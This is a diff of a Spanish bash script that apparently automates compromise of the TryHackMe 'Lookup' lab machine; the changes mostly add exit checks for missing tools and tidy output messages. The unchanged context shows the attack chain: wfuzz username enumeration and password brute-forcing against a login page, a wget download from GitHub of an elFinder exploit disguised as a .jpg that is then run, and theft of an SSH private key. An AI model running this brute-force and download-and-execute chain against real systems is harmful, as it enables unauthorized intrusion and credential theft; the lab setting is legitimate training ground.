@@ -31,10 +31,11 @@ sscp=$(which scp)
 exit_scp=$?
 
 if [ "$exit_scp" = 0 ];then
-        echo "[+] Python2 instalado $sscp"
+        echo "[+] scp instalado $sscp"
 
 else
         echo "scp no encontrado."
+	exit 1
 fi
 
 
@@ -43,6 +44,7 @@ if [ "$exit_sshpass" = 0 ];then
 
 else
         echo "sshpass no encontrado."
+	exit 1
 fi
 
 
@@ -51,6 +53,7 @@ if [ "$exit_wget" = 0 ];then
 
 else
         echo "wget no encontrado."
+	exit 1
 fi
 
 
@@ -59,6 +62,7 @@ if [ "$exit_py2" = 0 ];then
 
 else
 	echo "Python2 no encontrado."
+	exit 1
 fi
 
 
@@ -67,6 +71,7 @@ if [ "$exit_hy" = 0 ];then
 
 else
         echo "Hydra no encontrado."
+	exit 1
 fi
 
 
@@ -75,6 +80,7 @@ if [ "$exit_ssh" = 0 ];then
 
 else
         echo "ssh no encontrado."
+	exit 1
 fi
 
 
@@ -82,7 +88,8 @@ if [ "$exit_wfuz" = 0 ];then
         echo "[+] wfuzz instalado $wfuz"
 
 else
-        echo "wfuzz no encontrado."
+        echo -e "wfuzz no encontrado.\n"
+	exit 1
 fi
 
 
@@ -93,7 +100,7 @@ cp /etc/hosts "$etchosts"
 echo "$ip $dominio $subdominio" >> /etc/hosts
 
 
-echo -e "[+] Buscando usuarios: \n"
+echo -e "\n[+] Buscando usuarios: \n"
 
 sudo wfuzz --hw=10 -c -t 100 -w /usr/share/SecLists/Usernames/Names/names.txt -H "Cookie: login_status=success"  -f file.txt -d "username=FUZZ&password=nose" http://lookup.thm/login.php 1>/dev/null
 
@@ -104,7 +111,7 @@ echo -e "\n[+] Probando credenciales... \n"
 sudo wfuzz --hc=200 -t 100 -c -w /usr/share/wordlists/fasttrack.txt -f session.txt -H "Cookie: login_status=success" -d "username=jose&password=FUZZ" http://lookup.thm/login.php 1>/dev/null
 cat session.txt | grep -i 302 | awk '{print "Password encontrada para jose: "$NF}'| tr -d '"' && rm session.txt
 
-echo -e "\nExploit para el finder encontrado"
+echo -e "\nExploit para elfinder encontrado"
 echo "Descargando y ejecutando..."
 
 wget -q https://raw.githubusercontent.com/shosdoo/AutoPwn_lookupTHM/refs/heads/main/SecSignal.jpg -O SecSignal.jpg
@@ -143,3 +150,4 @@ echo -e "\n[+] Pwned! id_rsa guardado en: $dirid"
 
 rm user.txt && rm root.txt
 mv "$etchosts" /etc/hosts
+
